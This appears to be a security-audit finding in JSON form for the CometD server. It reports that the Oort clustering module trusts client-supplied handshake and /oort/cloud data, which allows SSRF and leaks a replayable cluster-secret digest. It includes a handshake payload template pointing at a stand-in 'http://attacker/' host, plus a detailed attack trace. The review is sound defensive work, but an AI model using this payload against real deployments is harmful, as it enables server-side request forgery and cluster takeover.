@@ -1,0 +1,81 @@
+{
+  "candidates": [
+    {
+      "attacker_control": "Path A (handshake): a client sends /meta/handshake with ext = {\"org.cometd.oort\": {\"oortURL\":\"http://attacker/…\", \"oortId\":\"<any-id-not-victim's>\", \"cometURL\":\"<victim URL or anything>\"}} (oortAliasURL omitted so the \"avoid reconnect\" branch is skipped). With the default DefaultSecurityPolicy (BayeuxServerImpl line 99) the handshake is granted to anyone; with the SecurityPolicy sample in OortDocs.java lines 109-126 it is granted to any holder of the app token. Path B (publish): a handshaken client publishes to `/oort/cloud` with data = [\"http://attacker/…\"] (channel has GRANT_ALL, and the default policy allows publish by any handshook session on non-meta channels). Both carry fully attacker-controlled URL strings.",
+      "confidence": "medium",
+      "counterevidence_checked": "OortMembership.observeComet validates URI scheme/host (rejects e.g. file:/jar:), so the SSRF is limited to scheme+host URLs; the transmitted secret is a SHA-512 digest rather than plaintext, but it is exactly the replay value accepted by isOortHandshake, so hashing does not prevent replay; the Oort module is optional and deployments are expected to install a SecurityPolicy (the OortDocs/OortSetiDocs sample policies restrict handshakes), which reduces the handshake path to token-holding clients - however the documented policies only guard canHandshake, they do not stop an allowed client from supplying the Oort ext map or publishing on the GRANT_ALL cloud channel, and the shipped default policy allows everyone; observed URL string is only consumed when it parses as an absolute http(s) URI.",
+      "id": "cometd-oort-client-controlled-membership",
+      "impact": "Server-side request forgery: the CometD node makes outbound HTTP(S) Bayeux handshake requests to attacker-chosen hosts/ports (scheme and host are syntactically validated, but internal http(s) addresses are allowed), enabling internal reachability probing and blind request forgery from the server. Credential disclosure: the outbound handshake body contains ext.org.cometd.oort.oortSecret = Base64(SHA-512(local secret)) plus the internal oortURL/ids; because Oort.isOortHandshake (Oort.java 475-496) accepts exactly this value, the attacker can replay it in a handshake with cometURL equal to the victim's URL to be accepted as an Oort node, and then participate in cluster channels (/oort/cloud, /seti/**, /service/oort/**) - injecting spoofed presence/messages/object state and receiving cluster broadcasts (e.g. Seti presence and OortObject contents that can carry session/user data). Repeated URL entries also cause unbounded outbound connection attempts (resource consumption).",
+      "locations": [
+        {
+          "end_line": 615,
+          "path": "cometd-java/cometd-java-oort/src/main/java/org/cometd/oort/OortMembership.java",
+          "start_line": 496
+        },
+        {
+          "end_line": 168,
+          "path": "cometd-java/cometd-java-oort/src/main/java/org/cometd/oort/Oort.java",
+          "start_line": 166
+        },
+        {
+          "end_line": 587,
+          "path": "cometd-java/cometd-java-oort/src/main/java/org/cometd/oort/Oort.java",
+          "start_line": 581
+        },
+        {
+          "end_line": 643,
+          "path": "cometd-java/cometd-java-oort/src/main/java/org/cometd/oort/Oort.java",
+          "start_line": 635
+        },
+        {
+          "end_line": 513,
+          "path": "cometd-java/cometd-java-oort/src/main/java/org/cometd/oort/Oort.java",
+          "start_line": 475
+        },
+        {
+          "end_line": 231,
+          "path": "cometd-java/cometd-java-oort/src/main/java/org/cometd/oort/OortMembership.java",
+          "start_line": 182
+        },
+        {
+          "end_line": 773,
+          "path": "cometd-java/cometd-java-server/cometd-java-server-common/src/main/java/org/cometd/server/BayeuxServerImpl.java",
+          "start_line": 760
+        }
+      ],
+      "prerequisites": "Application uses the Oort clustering module (cometd-java-oort; e.g. OortMulticastConfigServlet/OortStaticConfigServlet as in cometd-demo/src/main/webapp/WEB-INF/web.xml) and does not add per-channel Authorizers on `/oort/cloud` (none are installed by the library). The attacker must be able to handshake (allowed by default; otherwise needs the app's client token) and, for path B, to publish on `/oort/cloud`.",
+      "root_cause": "The Oort membership protocol processes Oort extension fields that arrive from ordinary client sessions without verifying the shared Oort secret. OortMembership.OortExtension.sendMeta() only checks that the handshake reply is successful and that the request ext contains an `org.cometd.oort` map (comment says \"Must be an Oort handshake\", but Oort.isOortHandshake() is never called); it then stores the client-supplied oortURL and calls observeComet(remoteOortURL, cometURL). Independently, Oort.CloudListener only requires `!from.isLocalSession()` for a publish on `/oort/cloud` (which Oort.doStart() gives GrantAuthorizer.GRANT_ALL) and calls joinComets()/observeComet() with attacker-supplied URL strings. observeComet() builds an OortComet and connects using Oort.newOortHandshakeFields(), which transmits the local secret as Base64(SHA-512(secret)) to whatever URL was supplied, and Oort.isOortHandshake() accepts exactly that value on a later handshake (no nonce), making the digest replayable.",
+      "title": "Oort cluster membership trusts client-supplied handshake ext and /oort/cloud publishes: SSRF and replayable Oort secret disclosure",
+      "trace": "Handshake path: transport -> BayeuxServerImpl.handleMetaHandshake (line 1360-1377, policy allows) -> handleMetaHandshake1 (line 1380-1401, reply successful) -> transport processReply -> BayeuxServerImpl.extendReply (line 1105-1120) -> server Extension.outgoing/sendMeta -> OortMembership.OortExtension.sendMeta (lines 498-535: no isOortHandshake check) -> session.setAttribute(COMET_URL_ATTRIBUTE, remoteOortURL) (line 537) -> observeComet(remoteOortURL, cometURL) (line 610) -> OortMembership.observeComet (lines 182-231) -> createOortComet/connectComet -> Oort.newOortHandshakeFields (Oort.java 498-513, embeds Base64(SHA-512(secret)) at line 506) -> outbound handshake to attacker URL. Publish path: BayeuxServerImpl.handle2 (line 727-742) -> isPublishAuthorized (760-773; DefaultSecurityPolicy + GrantAuthorizer.GRANT_ALL on /oort/cloud) -> publish -> notifyListeners (980-1004) -> Oort.CloudListener.onMessage (635-643, condition `!from.isLocalSession()` is true for the attacker) -> joinComets (581-587) -> observeComet -> same outbound path.",
+      "unverified": "Not executed/confirmed at runtime; no VCS history, tests, or upstream code in the snapshot to determine whether `!from.isLocalSession()` / the missing isOortHandshake call is original behaviour or a regression, or whether a later upstream release added such a check. Whether an attacker's server must complete a Bayeux handshake for any impact (not required for the secret disclosure, which occurs with the first outbound request) and exact Jetty client transport behaviour were not verified.",
+      "weakness_type": "Missing verification of message origin/authentication in cluster protocol (CWE-306/CWE-862) leading to server-side request forgery (CWE-918) and sensitive credential disclosure (CWE-200)"
+    }
+  ],
+  "coverage_summary": "Scope: 347 files / 178 Java files under the assigned root, all readable text per get_source_scope (binary-like files skipped; no test sources are present in the snapshot). Read in depth: cometd-java-server-common (BayeuxServerImpl, AbstractHttpTransport/Stream/AsyncJSON/JSON/JSONP transports, ServerSessionImpl, ServerChannelImpl, AbstractService, filters, extensions), server WebSocket transports, cometd-java-oort (Oort, OortMembership, OortService, OortObject, Seti, OortContainer, OortMulticastConfigurer, OortConfigServlet), cometd-java-api common/server, parts of annotation and common modules, and documentation/example/doc-let files plus the demo web.xml (used to establish the concrete Oort deployment). JavaScript cometd.js (3700 lines) and client modules were inspected selectively via targeted searches (innerHTML/eval/script creation/_mixin), not line-by-line. get_relation_scope reports a partial index: syntax-level only, control-flow and data-flow not implemented, semantic resolution not implemented, 8 files with parse errors, 7109 unresolved calls; index facts were used only for navigation and every cited edge/location was verified against source text.",
+  "limitations": [
+    "No tests, VCS history, changelog, or upstream reference are present in the snapshot, so I could not distinguish original upstream code from a reverted/weakened check or confirm whether a later release fixed the Oort trust issue.",
+    "No code execution, build, or scan was performed (read-only review), so all impact statements are source-level inference, not runtime-confirmed.",
+    "The main asciidoc documentation (which may describe Oort channel hardening expectations) is not included in the snapshot; the documentation .java doc-let files give only the sample SecurityPolicy, which does not protect Oort channels from allowed clients.",
+    "cometd-javascript/cometd.js and the Java client modules were only partially reviewed (targeted greps plus selected functions); a client-side issue there cannot be fully excluded.",
+    "The P1 index is partial (see get_relation_scope); areas without index records were not assumed to be reviewed without direct reading."
+  ],
+  "rejected_leads": [
+    {
+      "lead": "AbstractWebSocketEndPoint.processMessages adopts an existing session by client-supplied clientId when requireHandshakePerConnection=false (cometd-java-server-websocket-common, lines 134-139)",
+      "reason": "Appears to be intentional upstream behaviour (dedicated requireHandshakePerConnection option, default false) and the clientId is an unguessable SecureRandom-derived bearer token; no source evidence of an unintended weakening was found, so it was not claimed."
+    },
+    {
+      "lead": "Z85.Decoder.decodeBytes indexes decodeTable with char-32 without range validation (cometd-java-common/.../Z85.java lines 100-102), reachable via BinaryExtension/BinarySessionExtension rcv decoding of client data",
+      "reason": "Would throw ArrayIndexOutOfBoundsException, but extension exceptions are caught and logged (BayeuxServerImpl.extendIncoming / ServerSessionImpl.extendIncoming) and the extension is not enabled by default; no demonstrable security impact, so it was not claimed."
+    },
+    {
+      "lead": "OortService.onMessage, OortObject.BroadcastListener/ServiceListener and Seti presence/message handling also process messages from non-Oort sessions (OortService.java 253-263, OortObject.java 688-735, Seti.java 537-573)",
+      "reason": "Same trust-boundary theme as the submitted candidate (client messages on cluster channels treated as cluster traffic) and therefore not counted as a separate candidate; it is mentioned as corroborating context, not as an additional finding."
+    },
+    {
+      "lead": "DefaultSecurityPolicy allows handshake and publish for unauthenticated clients (cometd-java-server-common/.../DefaultSecurityPolicy.java)",
+      "reason": "Default is intentional and documented ('policy may deny handshakes'); the concrete issue is the Oort trust check, not the policy default itself."
+    }
+  ],
+  "summary": "Reviewed the CometD 5.0.11-SNAPSHOT source tree (347 files, 178 Java) at the 5.0.11-SNAPSHOT parent version, tracing the Bayeux request path (CometDServlet -> AbstractHttpTransport/AbstractWebSocketEndPoint -> BayeuxServerImpl.handle/handle1/handle2 -> isPublishAuthorized/publish -> notifyListeners/subscribers), the session/security model (DefaultSecurityPolicy, Authorizer/GrantAuthorizer, SecurityPolicy), the annotation/service layer, the Oort/Seti clustering module, and the JavaScript client at a lower depth. One candidate is submitted: the Oort clustering module treats client-supplied handshake extension data and client publishes on the GRANT_ALL `/oort/cloud` channel as trusted cluster traffic, without verifying the Oort shared secret (`isOortHandshake`) or the sender's Oort-ness. This lets a client that the deployment allows to handshake (everyone under the default policy; any authenticated client under the documented Oort policy) make the server open an outbound Bayeux connection to an attacker-chosen http(s) URL; the handshake sent on that connection contains the replayable Oort secret digest and internal Oort URL, so the attacker can then authenticate as an Oort node and inject/observe cluster traffic. This is a lead, not a runtime-confirmed vulnerability; upstream intent could not be verified from the snapshot (no VCS/tests)."
+}
